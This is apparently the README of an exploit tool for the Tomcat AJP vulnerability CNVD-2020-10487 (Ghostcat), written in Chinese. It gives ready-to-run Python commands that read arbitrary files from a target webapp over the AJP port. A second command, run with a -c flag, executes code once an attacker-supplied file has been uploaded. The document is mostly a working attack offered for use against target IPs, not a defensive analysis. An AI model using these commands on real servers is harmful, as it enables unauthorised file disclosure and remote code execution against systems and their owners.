# CNVD-2020-10487-Tomcat-Ajp
Tomcat-Ajp协议漏洞

## 使用

1. 读取指定webapp下的指定文件
``` shell
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -f path/to/readfile.file -w webappname -p ajp_port target_ip
```

运行示例：
![](./img/read_file.png)

2. 执行命令，以此漏洞执行命令的前提是攻击的Tomcat webapp目录中存在内容可控的任意文件，该文件可以不是以.jsp或者.jspx格式结尾的文件，任意文件名即可，只需保证文件内容能被jsp解析器正确解析（可通过webapp提供的文件上传功能实现文件上传）。
使用方法与读取文件方法类似，只需加上-c 参数即可。
``` shell
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -f path/to/remote_code.file -w webappname/path/to/jspname.jsp -p ajp_port target_ip -c
```

运行示例：
![](./img/code_execute.png)
